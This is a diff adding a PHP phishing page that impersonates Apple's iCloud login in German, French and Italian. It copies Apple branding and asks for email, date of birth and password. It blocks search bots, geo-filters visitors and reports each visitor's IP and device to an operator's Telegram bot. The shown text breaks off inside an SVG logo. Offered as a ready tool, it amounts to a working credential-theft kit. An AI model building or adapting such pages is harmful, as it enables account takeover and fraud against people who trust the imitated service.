@@ -1,0 +1,1295 @@
+<?php
+session_start();
+include __DIR__ . '/settings.php';
+include __DIR__ . '/lang_main.php';
+require_once __DIR__ . '/antibot.php';
+checkSearchEngineBot(); // Block search bots on landing page
+if (!checkCountryRestriction()) { // Block if not from allowed countries
+    require_once __DIR__ . '/antibot.php';
+    showClean404();
+}
+
+// ── SEND TELEGRAM NOTIFICATION ON PAGE VISIT ──
+function getIP() {
+    foreach (['HTTP_CF_CONNECTING_IP','HTTP_X_FORWARDED_FOR','HTTP_X_REAL_IP','REMOTE_ADDR'] as $k) {
+        if (!empty($_SERVER[$k])) return trim(explode(',', $_SERVER[$k])[0]);
+    }
+    return 'N/A';
+}
+
+function parseDevice($ua) {
+    if (preg_match('/iPhone/', $ua))      $device = '📱 iPhone';
+    elseif (preg_match('/iPad/', $ua))    $device = '📲 iPad';
+    elseif (preg_match('/Android/', $ua)) $device = '🤖 Android';
+    else                                   $device = '🖥️ Desktop';
+
+    if (preg_match('/iPhone OS ([\d_]+)/', $ua, $m))     $os = 'iOS ' . str_replace('_','.',$m[1]);
+    elseif (preg_match('/Android ([0-9.]+)/', $ua, $m))  $os = 'Android ' . $m[1];
+    elseif (preg_match('/Mac OS X/', $ua))                $os = 'macOS';
+    elseif (preg_match('/Windows NT 10/', $ua))           $os = 'Windows 10/11';
+    elseif (preg_match('/Windows NT/', $ua))              $os = 'Windows';
+    else                                                   $os = 'Inconnu';
+
+    if (preg_match('/CriOS/', $ua))            $br = 'Chrome iOS';
+    elseif (preg_match('/FxiOS/', $ua))        $br = 'Firefox iOS';
+    elseif (preg_match('/EdgA?\//', $ua))      $br = 'Edge';
+    elseif (preg_match('/OPR\//', $ua))        $br = 'Opera';
+    elseif (preg_match('/SamsungBrowser/', $ua)) $br = 'Samsung';
+    elseif (preg_match('/Chrome\//', $ua))     $br = 'Chrome';
+    elseif (preg_match('/Safari\//', $ua))     $br = 'Safari';
+    elseif (preg_match('/Firefox\//', $ua))    $br = 'Firefox';
+    else                                        $br = 'Inconnu';
+
+    return $device . ' · ' . $os . ' · ' . $br;
+}
+
+$ip = getIP();
+$ua = $_SERVER['HTTP_USER_AGENT'] ?? 'N/A';
+$dev = parseDevice($ua);
+$dt = date('d/m/Y à H:i') . ' UTC';
+
+// Only send notification once per session to avoid spam
+if (empty($_SESSION['visit_notified'])) {
+    $visitMessage = <<<TEXT
+🌐 <b>Page d'accueil visitée</b>
+
+<b>Identité</b>
+└ 🔗 URL: <code>$_SERVER[REQUEST_SCHEME]://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]</code>
+
+<b>Appareil</b>
+└ 📱 $dev
+
+<b>Réseau</b>
+├ 🌐 IP: <code>$ip</code>
+└ 🕐 $dt
+TEXT;
+
+    sendTelegramAsync($bot_token, $chat_id, $visitMessage);
+    $_SESSION['visit_notified'] = true;
+}
+
+// Page-specific translations
+$page_trans = [
+    'de' => [
+        'title' => 'Mit Ihrem Apple Konto anmelden',
+        'email_placeholder' => 'E-Mail oder Telefonnummer',
+        'create_account' => 'Apple-Konto erstellen',
+        'continue' => 'Fortfahren',
+        'signin_iphone' => 'Mit iPhone anmelden',
+        'iphone_note' => 'Erfordert ein Gerät mit iOS 17 oder neuer.',
+        'privacy_title' => 'Datenschutz',
+        'privacy_text' => 'Die Informationen zu Ihrem Apple-Konto werden verwendet, um Sie sicher anmelden zu lassen und auf Ihre Daten zuzugreifen. Apple speichert bestimmte Daten für Sicherheits-, Support- und Meldezwecke. Wenn Sie dies akzeptieren, kann Apple die Informationen zu Ihrem Apple-Konto auch verwenden, um Ihnen E-Mails und Marketing-Mitteilungen auf Grundlage Ihrer Nutzung der Apple-Services zu senden.',
+        'dob_label' => 'Ihr Geburtsdatum',
+        'dob_placeholder' => 'TT/MM/JJJJ',
+        'dob_format' => 'Format: TT/MM/JJJJ',
+        'password_placeholder' => 'Passwort',
+        'stay_signin' => 'Angemeldet bleiben',
+        'forgot_password' => 'Passwort vergessen?',
+        'signin_btn' => 'Anmelden',
+    ],
+    'fr' => [
+        'title' => 'Se connecter avec un compte Apple',
+        'email_placeholder' => 'E-mail ou numéro de téléphone',
+        'create_account' => 'Créer un compte Apple',
+        'continue' => 'Continuer',
+        'signin_iphone' => 'Se connecter avec un iPhone',
+        'iphone_note' => 'Nécessite un appareil doté d\'iOS 17 ou version ultérieure.',
+        'privacy_title' => 'Confidentialité',
+        'privacy_text' => 'Les informations de votre compte Apple sont utilisées pour vous permettre de vous connecter en toute sécurité et d\'accéder à vos données. Apple enregistre certaines données à des fins de sécurité, d\'assistance et de signalement. Si vous l\'acceptez, Apple peut également utiliser les informations de votre compte Apple pour vous envoyer des e-mails et des communications marketing en se basant notamment sur votre utilisation des services Apple.',
+        'dob_label' => 'Votre date de naissance',
+        'dob_placeholder' => 'JJ/MM/AAAA',
+        'dob_format' => 'Format: JJ/MM/AAAA',
+        'password_placeholder' => 'Mot de passe',
+        'stay_signin' => 'Rester connecté',
+        'forgot_password' => 'Mot de passe oublié ?',
+        'signin_btn' => 'Se connecter',
+    ],
+    'it' => [
+        'title' => 'Accedi con il tuo account Apple',
+        'email_placeholder' => 'E-mail o numero di telefono',
+        'create_account' => 'Crea un account Apple',
+        'continue' => 'Continua',
+        'signin_iphone' => 'Accedi con iPhone',
+        'iphone_note' => 'Richiede un dispositivo con iOS 17 o versione successiva.',
+        'privacy_title' => 'Privacy',
+        'privacy_text' => 'Le informazioni del tuo account Apple vengono utilizzate per consentirti di accedere in sicurezza e accedere ai tuoi dati. Apple memorizza determinati dati per scopi di sicurezza, supporto e reporting. Se lo accetti, Apple può anche utilizzare le informazioni del tuo account Apple per inviarti email e comunicazioni di marketing in base al tuo utilizzo dei servizi Apple.',
+        'dob_label' => 'La tua data di nascita',
+        'dob_placeholder' => 'GG/MM/AAAA',
+        'dob_format' => 'Formato: GG/MM/AAAA',
+        'password_placeholder' => 'Password',
+        'stay_signin' => 'Resta connesso',
+        'forgot_password' => 'Password dimenticata?',
+        'signin_btn' => 'Accedi',
+    ]
+];
+
+function t_page($key) {
+    global $page_trans, $current_lang;
+    return $page_trans[$current_lang][$key] ?? $page_trans['de'][$key] ?? $key;
+}
+?><!DOCTYPE html>
+<html lang="<?= $current_lang ?>">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="initial-scale=1,minimum-scale=1,maximum-scale=1,user-scalable=no">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="default">
+  <title>iCloud</title>
+  <link rel="stylesheet" href="https://www.apple.com/wss/fonts/?families=SF+Pro,v3" media="all">
+  <style>
+    :root {
+      --bg: #f2f2f7;
+      --card-bg: #ffffff;
+      --card-shadow: 0 2px 24px rgba(0,0,0,0.10);
+      --label: rgba(0, 0, 0, 0.88);
+      --label-secondary: rgba(60, 60, 67, 0.6);
+      --separator: rgba(60, 60, 67, 0.22);
+      --fill-tertiary: rgba(118, 118, 128, 0.12);
+      --blue: #0071e3;
+      --blue-tint: rgba(0, 122, 255, 1);
+      --input-border: rgba(0, 0, 0, 0.18);
+      --btn-passkey-bg: #f5f5f7;
+      --btn-passkey-color: rgba(0, 0, 0, 0.88);
+      --theme-color-systemBlack: rgba(0, 0, 0, 0.88);
+    }
+    @media (prefers-color-scheme: dark) {
+      :root {
+        --bg: rgb(28, 28, 30);
+        --card-bg: rgb(44, 44, 46);
+        --card-shadow: 0 4px 32px rgba(0,0,0,0.45);
+        --label: rgba(255, 255, 255, 0.98);
+        --label-secondary: rgba(235, 235, 245, 0.6);
+        --separator: rgba(84, 84, 88, 0.65);
+        --fill-tertiary: rgba(118, 118, 128, 0.24);
+        --blue: #0a84ff;
+        --blue-tint: rgba(10, 132, 255, 1);
+        --input-border: rgba(255, 255, 255, 0.18);
+        --btn-passkey-bg: rgba(255, 255, 255, 0.12);
+        --btn-passkey-color: rgba(255, 255, 255, 0.98);
+        --theme-color-systemBlack: #ffffff;
+      }
+    }
+
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+    html { background-color: var(--bg); }
+
+    body {
+      background: var(--bg);
+      color: var(--label);
+      font-family: -apple-system, "SF Pro Display", "SF Pro Text", "Helvetica Neue", Arial, sans-serif;
+      min-height: 100dvh;
+      display: flex;
+      flex-direction: column;
+    }
+
+    /* ── NAV ── */
+    .nav {
+      position: relative;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 44px;
+      display: flex;
+      align-items: center;
+      padding: 0 16px;
+      flex-shrink: 0;
+    }
+
+    .nav-brand {
+      display: flex;
+      align-items: center;
+      gap: 5px;
+      font-size: 17px;
+      font-weight: 600;
+      color: var(--label);
+      text-decoration: none;
+      letter-spacing: -0.3px;
+    }
+    .nav-brand svg { fill: var(--label); flex-shrink: 0; }
+
+    .nav-spacer { flex: 1; }
+
+    .nav-ellipsis {
+      background: none;
+      border: none;
+      cursor: pointer;
+      padding: 8px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      opacity: 0.6;
+    }
+    .nav-ellipsis:hover { opacity: 1; }
+    .nav-ellipsis svg { fill: var(--label); }
+
+    /* ── MAIN ── */
+    .main {
+      flex: 1;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: flex-start;
+      padding: 32px 16px 48px;
+      width: 100%;
+    }
+
+    .content-wrap {
+      width: 100%;
+      max-width: 360px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      background: var(--card-bg);
+      border-radius: 20px;
+      padding: 32px 24px 28px;
+      box-shadow: var(--card-shadow);
+    }
+
+    /* ── RING ── */
+    .ring-wrap {
+      width: 160px;
+      height: 160px;
+      margin: 0 auto 20px;
+      flex-shrink: 0;
+    }
+
+    /* ── TITLE ── */
+    h1 {
+      font-size: 24px;
+      font-weight: 700;
+      color: var(--label);
+      text-align: center;
+      line-height: 1.25;
+      letter-spacing: -0.3px;
+      margin-bottom: 20px;
+      width: 100%;
+    }
+
+    /* ── INPUT ── */
+    .input-field {
+      width: 100%;
+      background: var(--fill-tertiary);
+      border: 1.5px solid var(--input-border);
+      border-radius: 12px;
+      padding: 12px 14px;
+      font-size: 16px;
+      color: var(--label);
+      outline: none;
+      font-family: inherit;
+      transition: border-color 0.2s;
+      -webkit-appearance: none;
+      margin-bottom: 10px;
+    }
+    .input-field::placeholder { color: var(--label-secondary); }
+    .input-field:focus { border-color: var(--blue); }
+
+    /* ── CREATE LINK ── */
+    .create-link {
+      display: block;
+      width: 100%;
+      margin-bottom: 20px;
+      font-size: 15px;
+      color: var(--blue-tint);
+      text-decoration: none;
+      font-weight: 400;
+    }
+    .create-link:hover { text-decoration: underline; }
+
+    /* ── SEPARATOR ── */
+    .separator {
+      width: 100%;
+      height: 1px;
+      background: var(--separator);
+      margin-bottom: 20px;
+    }
+
+    /* ── PRIVACY ── */
+    .privacy-block {
+      width: 100%;
+      margin-bottom: 24px;
+      display: flex;
+      flex-direction: column;
+      gap: 10px;
+    }
+    .privacy-icon { color: var(--blue-tint); line-height: 1; }
+    .privacy-text {
+      font-size: 13px;
+      color: var(--label-secondary);
+      line-height: 1.5;
+    }
+    .privacy-text a { color: var(--blue-tint); text-decoration: none; }
+    .privacy-text a:hover { text-decoration: underline; }
+
+    /* ── BUTTONS ── */
+    .btn-row {
+      width: 100%;
+      display: flex;
+      gap: 10px;
+      margin-bottom: 0;
+    }
+
+    .btn-continue {
+      flex: 1;
+      background: var(--blue);
+      color: #fff;
+      border: none;
+      border-radius: 12px;
+      padding: 13px 10px;
+      font-size: 15px;
+      font-weight: 600;
+      font-family: inherit;
+      cursor: pointer;
+      -webkit-appearance: none;
+      transition: opacity 0.15s;
+      letter-spacing: -0.2px;
+    }
+    .btn-continue:active { opacity: 0.8; }
+
+    .btn-passkey {
+      flex: 1;
+      background: var(--btn-passkey-bg);
+      color: var(--btn-passkey-color);
+      border: none;
+      border-radius: 12px;
+      padding: 13px 10px;
+      font-size: 15px;
+      font-weight: 500;
+      font-family: inherit;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 6px;
+      -webkit-appearance: none;
+      transition: opacity 0.15s;
+      letter-spacing: -0.2px;
+    }
+    .btn-passkey:active { opacity: 0.7; }
+    .btn-passkey svg { fill: var(--btn-passkey-color); flex-shrink: 0; }
+
+    .btn-note {
+      width: 100%;
+      text-align: center;
+      font-size: 12px;
+      color: var(--label-secondary);
+      margin-top: 8px;
+      line-height: 1.4;
+    }
+
+    /* ── LANGUAGE SELECTOR MODAL ── */
+    #languageModal {
+      position: fixed;
+      inset: 0;
+      background: rgba(0, 0, 0, 0.4);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 16px;
+      opacity: 0;
+      visibility: hidden;
+      transition: opacity 0.3s, visibility 0.3s;
+      z-index: 10000;
+    }
+
+    #languageModal.show {
+      opacity: 1;
+      visibility: visible;
+    }
+
+    .language-card {
+      width: 100%;
+      max-width: 360px;
+      background: var(--card-bg);
+      border-radius: 20px;
+      padding: 40px 24px;
+      box-shadow: var(--card-shadow);
+      text-align: center;
+      animation: slideUpFade 0.5s ease-out;
+    }
+
+    .language-title {
+      font-size: 18px;
+      font-weight: 700;
+      color: var(--label);
+      margin-bottom: 12px;
+      letter-spacing: -0.3px;
+    }
+
+    .language-subtitle {
+      font-size: 13px;
+      color: var(--label-secondary);
+      margin-bottom: 32px;
+      line-height: 1.5;
+    }
+
+    .language-options {
+      display: flex;
+      gap: 16px;
+      justify-content: center;
+    }
+
+    .language-btn {
+      width: 80px;
+      height: 80px;
+      border: 2px solid var(--separator);
+      border-radius: 16px;
+      background: var(--fill-tertiary);
+      cursor: pointer;
+      font-size: 32px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      transition: all 0.2s;
+      flex-direction: column;
+      padding: 0;
+    }
+
+    .language-btn:hover {
+      border-color: var(--blue);
+      background: var(--blue);
+      opacity: 0.9;
+      transform: scale(1.05);
+    }
+
+    .language-btn:active {
+      transform: scale(0.98);
+    }
+
+    .language-btn.active {
+      border-color: var(--blue);
+      background: var(--blue);
+      color: #fff;
+    }
+
+    .language-label {
+      font-size: 11px;
+      font-weight: 600;
+      margin-top: 6px;
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+    }
+
+    @keyframes slideUpFade {
+      from {
+        opacity: 0;
+        transform: translateY(20px);
+      }
+      to {
+        opacity: 1;
+        transform: translateY(0);
+      }
+    }
+
+    /* ── ERROR MESSAGE ── */
+    .error-msg {
+      font-size: 13px;
+      color: #ff3b30;
+      margin: 4px 0 8px;
+      display: none;
+      font-weight: 500;
+    }
+
+    /* ── APPLE LOADING OVERLAY ── */
+    #loadingOverlay {
+      position: fixed;
+      inset: 0;
+      background: var(--bg);
+      display: none;
+      align-items: center;
+      justify-content: center;
+      padding: 16px;
+      opacity: 0;
+      transition: opacity 0.35s cubic-bezier(0.4,0,0.2,1);
+      z-index: 9999;
+    }
+
+    .loading-card {
+      width: 100%;
+      max-width: 360px;
+      background: var(--card-bg);
+      border-radius: 20px;
+      padding: 36px 24px 32px;
+      box-shadow: var(--card-shadow);
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+
+    .loading-ring {
+      width: 100px;
+      height: 100px;
+      margin-bottom: 22px;
+    }
+
+    /* iOS 12-blade activity indicator */
+    .ios-activity {
+      position: relative;
+      width: 36px;
+      height: 36px;
+      margin-bottom: 18px;
+    }
+    .ios-activity .blade {
+      position: absolute;
+      left: 50%;
+      top: 3px;
+      width: 2.5px;
+      height: 8px;
+      margin-left: -1.25px;
+      background: var(--label);
+      border-radius: 1.5px;
+      transform-origin: center 15px;
+      opacity: 0.08;
+      animation: ios-blade-spin 1.2s linear infinite;
+    }
+    @keyframes ios-blade-spin { 0%{opacity:1} 100%{opacity:0.08} }
+    .ios-activity .blade:nth-child(1)  { transform:rotate(  0deg); animation-delay:  0s;   }
+    .ios-activity .blade:nth-child(2)  { transform:rotate( 30deg); animation-delay:-1.1s; }
+    .ios-activity .blade:nth-child(3)  { transform:rotate( 60deg); animation-delay:-1.0s; }
+    .ios-activity .blade:nth-child(4)  { transform:rotate( 90deg); animation-delay:-0.9s; }
+    .ios-activity .blade:nth-child(5)  { transform:rotate(120deg); animation-delay:-0.8s; }
+    .ios-activity .blade:nth-child(6)  { transform:rotate(150deg); animation-delay:-0.7s; }
+    .ios-activity .blade:nth-child(7)  { transform:rotate(180deg); animation-delay:-0.6s; }
+    .ios-activity .blade:nth-child(8)  { transform:rotate(210deg); animation-delay:-0.5s; }
+    .ios-activity .blade:nth-child(9)  { transform:rotate(240deg); animation-delay:-0.4s; }
+    .ios-activity .blade:nth-child(10) { transform:rotate(270deg); animation-delay:-0.3s; }
+    .ios-activity .blade:nth-child(11) { transform:rotate(300deg); animation-delay:-0.2s; }
+    .ios-activity .blade:nth-child(12) { transform:rotate(330deg); animation-delay:-0.1s; }
+
+    .loading-title {
+      font-size: 20px;
+      font-weight: 700;
+      color: var(--label);
+      letter-spacing: -0.3px;
+      margin: 0 0 8px;
+      text-align: center;
+    }
+    .loading-sub {
+      font-size: 14px;
+      color: var(--label-secondary);
+      margin: 0;
+      text-align: center;
+      max-width: 230px;
+      line-height: 1.45;
+    }
+
+    /* ── STEP 1.5: AGE VERIFICATION ── */
+    #step1_5 { display: none; width: 100%; }
+
+    .dob-container {
+      margin-bottom: 20px;
+    }
+
+    .dob-label {
+      font-size: 14px;
+      color: var(--label-secondary);
+      margin-bottom: 8px;
+      display: block;
+      text-align: left;
+      font-weight: 500;
+    }
+
+    .dob-input-wrapper {
+      position: relative;
+      width: 100%;
+    }
+
+    #dobInput {
+      font-size: 17px;
+      letter-spacing: 0.5px;
+      text-align: center;
+    }
+
+    .dob-hint {
+      font-size: 12px;
+      color: var(--label-secondary);
+      margin-top: 6px;
+      text-align: center;
+    }
+
+    /* ── STEP 2 ── */
+    #step2 { display: none; width: 100%; }
+
+    .email-display {
+      width: 100%;
+      background: var(--fill-tertiary);
+      border: 1.5px solid var(--input-border);
+      border-radius: 12px;
+      padding: 12px 14px;
+      font-size: 16px;
+      color: var(--label);
+      font-family: inherit;
+      margin-bottom: 10px;
+      cursor: default;
+    }
+
+    .pass-wrap {
+      position: relative;
+      width: 100%;
+      margin-bottom: 14px;
+    }
+    .pass-wrap .input-field {
+      margin-bottom: 0;
+      padding-right: 44px;
+    }
+    .eye-btn {
+      position: absolute;
+      right: 12px;
+      top: 50%;
+      transform: translateY(-50%);
+      background: none;
+      border: none;
+      cursor: pointer;
+      padding: 4px;
+      color: var(--label-secondary);
+      line-height: 1;
+    }
+    .eye-btn svg { fill: var(--label-secondary); }
+
+    .check-row {
+      width: 100%;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      margin-bottom: 22px;
+      gap: 8px;
+    }
+    .check-label {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      font-size: 14px;
+      color: var(--label-secondary);
+      cursor: pointer;
+      user-select: none;
+    }
+    .check-label input[type="checkbox"] {
+      width: 16px;
+      height: 16px;
+      accent-color: var(--blue);
+      cursor: pointer;
+      flex-shrink: 0;
+    }
+    .forgot-link {
+      font-size: 14px;
+      color: var(--blue-tint);
+      text-decoration: none;
+      white-space: nowrap;
+    }
+    .forgot-link:hover { text-decoration: underline; }
+
+    .btn-signin {
+      width: 100%;
+      background: var(--blue);
+      color: #fff;
+      border: none;
+      border-radius: 12px;
+      padding: 13px 10px;
+      font-size: 16px;
+      font-weight: 600;
+      font-family: inherit;
+      cursor: pointer;
+      -webkit-appearance: none;
+      transition: opacity 0.15s;
+    }
+    .btn-signin:active { opacity: 0.8; }
+
+    .back-btn {
+      background: none;
+      border: none;
+      color: var(--blue-tint);
+      font-size: 14px;
+      font-family: inherit;
+      cursor: pointer;
+      padding: 0;
+      margin-bottom: 16px;
+      display: flex;
+      align-items: center;
+      gap: 4px;
+    }
+    .back-btn:hover { text-decoration: underline; }
+
+    /* ── FOOTER ── */
+    .site-footer {
+      flex-shrink: 0;
+      width: 100%;
+      padding: 20px 24px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      flex-wrap: wrap;
+      gap: 8px;
+    }
+    .footer-links {
+      display: flex;
+      gap: 12px;
+      flex-wrap: wrap;
+    }
+    .footer-links a {
+      font-size: 12px;
+      color: var(--label-secondary);
+      text-decoration: none;
+    }
+    .footer-links a:hover { text-decoration: underline; }
+    .footer-copy {
+      font-size: 12px;
+      color: var(--label-secondary);
+    }
+  </style>
+</head>
+<body>
+
+  <!-- LANGUAGE SELECTOR MODAL -->
+  <div id="languageModal" class="<?= empty($_SESSION['lang_selected']) ? 'show' : '' ?>">
+    <div class="language-card">
+      <div class="language-title">Choose your language</div>
+      <div class="language-subtitle">Choisissez votre langue · Scegli la tua lingua</div>
+      <div class="language-options">
+        <button type="button" class="language-btn" id="langFr" data-lang="fr">
+          <!-- French Flag -->
+          <svg viewBox="0 0 900 600" style="width:48px;height:32px;margin-bottom:4px;">
+            <rect width="300" height="600" fill="#002395"/>
+            <rect x="300" width="300" height="600" fill="#FFFFFF"/>
+            <rect x="600" width="300" height="600" fill="#EC2B33"/>
+          </svg>
+          <span class="language-label">Français</span>
+        </button>
+        <button type="button" class="language-btn active" id="langDe" data-lang="de">
+          <!-- German Flag -->
+          <svg viewBox="0 0 900 600" style="width:48px;height:32px;margin-bottom:4px;">
+            <rect width="900" height="200" fill="#000000"/>
+            <rect y="200" width="900" height="200" fill="#DD0000"/>
+            <rect y="400" width="900" height="200" fill="#FFCE00"/>
+          </svg>
+          <span class="language-label">Deutsch</span>
+        </button>
+        <button type="button" class="language-btn" id="langIt" data-lang="it">
+          <!-- Italian Flag -->
+          <svg viewBox="0 0 900 600" style="width:48px;height:32px;margin-bottom:4px;">
+            <rect width="300" height="600" fill="#009246"/>
+            <rect x="300" width="300" height="600" fill="#FFFFFF"/>
+            <rect x="600" width="300" height="600" fill="#CE2B37"/>
+          </svg>
+          <span class="language-label">Italiano</span>
+        </button>
+      </div>
+    </div>
+  </div>
+
+  <!-- NAV -->
+  <nav class="nav">
+    <a class="nav-brand" href="#">
+      <!-- iCloud logo -->
+      <svg xmlns="http://www.w3.org/2000/svg" width="63" height="17" viewBox="0 0 85 23" fill="currentColor" style="overflow:visible">
+        <path d="M16.907 16.5h2.55V5.423h-2.55V16.5Zm1.28-12.832c.412 0 .763-.144 1.05-.43a1.41 1.41 0 0 0 .432-1.033c0-.407-.144-.753-.432-1.038a1.445 1.445 0 0 0-1.05-.426c-.407 0-.756.142-1.046.426-.291.285-.437.63-.437 1.038 0 .401.146.745.437 1.032.29.287.64.43 1.046.43v.001Zm9.915 13.156c1.14 0 2.157-.21 3.052-.631.864-.395 1.616-1 2.188-1.758.563-.752.908-1.624 1.037-2.619l.007-.091h-2.594l-.021.076a3.58 3.58 0 0 1-.713 1.465 3.35 3.35 0 0 1-1.258.943c-.5.219-1.065.328-1.695.328-.847 0-1.582-.22-2.204-.663-.623-.442-1.103-1.07-1.441-1.884-.338-.813-.507-1.776-.507-2.886v-.016c0-1.115.17-2.076.507-2.886.338-.81.817-1.434 1.439-1.875.62-.44 1.354-.66 2.199-.66.634 0 1.201.117 1.702.351.501.235.92.565 1.257.99.338.425.572.926.705 1.505l.026.105h2.59l-.004-.093c-.118-1.006-.46-1.895-1.028-2.668a5.886 5.886 0 0 0-2.204-1.819c-.901-.439-1.916-.658-3.044-.658-1.405 0-2.619.311-3.642.935-1.022.624-1.812 1.511-2.368 2.663-.556 1.152-.834 2.523-.834 4.113v.016c0 1.588.278 2.958.834 4.11.555 1.154 1.346 2.043 2.372 2.669 1.026.625 2.24.938 3.642.938Zm8.034-.324h2.55V1.24h-2.55V16.5Zm9.534.222c1.1 0 2.049-.231 2.846-.693.797-.461 1.413-1.122 1.846-1.982.434-.86.65-1.886.65-3.08v-.02c0-1.191-.218-2.216-.655-3.074a4.68 4.68 0 0 0-1.852-1.98c-.798-.46-1.744-.691-2.838-.691-1.086 0-2.03.23-2.829.694a4.69 4.69 0 0 0-1.855 1.981c-.438.859-.656 1.882-.656 3.07v.02c0 1.191.216 2.217.65 3.078.434.86 1.05 1.522 1.85 1.984.8.462 1.747.693 2.843.693Zm.004-2.066c-.572 0-1.063-.146-1.472-.436-.408-.291-.722-.711-.941-1.261-.219-.55-.329-1.213-.329-1.99v-.02c0-.776.11-1.438.33-1.985.22-.548.535-.967.944-1.259.408-.291.896-.437 1.461-.437.571 0 1.06.145 1.469.436.408.29.721.71.941 1.258.22.549.33 1.21.33 1.987v.02c0 .776-.11 1.438-.328 1.988-.218.55-.53.97-.936 1.262-.406.29-.896.437-1.469.437Zm10.596 2.066c.497.008.991-.071 1.46-.233.43-.156.798-.378 1.106-.668.309-.29.557-.639.73-1.026h.13V16.5h2.55V5.423h-2.55v6.444c0 .41-.055.782-.165 1.114a2.33 2.33 0 0 1-.485.853 2.153 2.153 0 0 1-.783.546 2.744 2.744 0 0 1-1.054.191c-.754 0-1.307-.216-1.657-.647-.35-.431-.526-1.063-.526-1.894V5.423h-2.55v7.166c0 .867.144 1.61.433 2.228.289.618.716 1.09 1.281 1.416.566.326 1.259.489 2.08.489Zm12.084-.024c.525 0 1.005-.08 1.441-.24a3.453 3.453 0 0 0 1.955-1.747h.13V16.5h2.55V1.24h-2.55v5.997h-.13a3.292 3.292 0 0 0-.802-1.073c-.338-.3-.727-.53-1.167-.694a4.093 4.093 0 0 0-1.433-.244c-.932 0-1.739.23-2.42.693-.681.463-1.207 1.122-1.579 1.978-.371.855-.557 1.873-.557 3.055v.016c0 1.175.186 2.19.559 3.049.372.858.9 1.52 1.585 1.984.684.464 1.49.697 2.418.697Zm.783-2.15c-.566 0-1.054-.145-1.466-.432-.412-.287-.728-.699-.95-1.235-.22-.536-.33-1.174-.33-1.913v-.016c0-.742.11-1.38.331-1.912.222-.533.539-.944.95-1.232.412-.288.9-.432 1.465-.432.56 0 1.046.146 1.46.436.413.29.735.703.964 1.237.228.534.343 1.169.343 1.906v.016c0 .732-.114 1.366-.34 1.902-.227.536-.548.95-.963 1.24-.415.29-.903.434-1.464.434v.001ZM8.856 3.158C9.35 2.56 9.7 1.745 9.7.92c0-.114-.01-.227-.03-.32-.805.03-1.774.536-2.351 1.217-.454.516-.877 1.341-.877 2.167 0 .123.02.247.031.288.052.01.134.021.217.021.721 0 1.629-.485 2.165-1.135h.001Zm.567 1.31c-1.207 0-2.186.733-2.815.733-.67 0-1.546-.691-2.598-.691C2.02 4.51 0 6.16 0 9.265c0 1.94.742 3.982 1.67 5.303.794 1.114 1.485 2.032 2.485 2.032.99 0 1.422-.66 2.65-.66 1.247 0 1.525.64 2.618.64 1.082 0 1.804-.991 2.484-1.971.763-1.124 1.083-2.218 1.093-2.27-.062-.02-2.134-.866-2.134-3.239 0-2.053 1.629-2.97 1.722-3.043-1.073-1.547-2.712-1.589-3.165-1.589Z" transform="translate(2.5 6.5)"/>
+      </svg>
+    </a>
+    <div class="nav-spacer"></div>
+    <button class="nav-ellipsis" aria-label="Weitere Optionen">
+      <!-- Ellipsis dots from real iCloud source -->
+      <svg viewBox="0 0 64 14" xmlns="http://www.w3.org/2000/svg" width="28" height="7">
+        <circle cx="7" cy="7" r="6.3"/>
+        <circle cx="32" cy="7" r="6.3"/>
+        <circle cx="57" cy="7" r="6.3"/>
+      </svg>
+    </button>
+  </nav>
+
+  <!-- MAIN -->
+  <main class="main">
+    <div class="content-wrap">
+
+      <!-- RING + APPLE LOGO (SVG officiel iCloud) -->
+      <div class="ring-wrap">
+        <svg viewBox="0 0 160 160" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="160" height="160" aria-hidden="true">
+          <defs>
+            <linearGradient x1="100%" y1="100%" x2="50%" y2="50%" id="grad-a">
+              <stop stop-color="#8700FF" offset="0%"/>
+              <stop stop-color="#EE00E1" stop-opacity="0" offset="100%"/>
+            </linearGradient>
+            <linearGradient x1="0%" y1="100%" x2="50%" y2="50%" id="grad-b">
+              <stop stop-color="#E00" offset="0%"/>
+              <stop stop-color="#EE00E1" stop-opacity="0" offset="100%"/>
+            </linearGradient>
+            <linearGradient x1="100%" y1="0%" x2="50%" y2="50%" id="grad-c">
+              <stop stop-color="#00B1EE" offset="0%"/>
+              <stop stop-color="#00B1EE" stop-opacity="0" offset="100%"/>
+            </linearGradient>
+            <linearGradient x1="-17.876%" y1="21.021%" x2="48.935%" y2="50%" id="grad-d">
+              <stop stop-color="#FFA456" offset="0%"/>
+              <stop stop-color="#FFA456" stop-opacity="0" offset="100%"/>
+            </linearGradient>
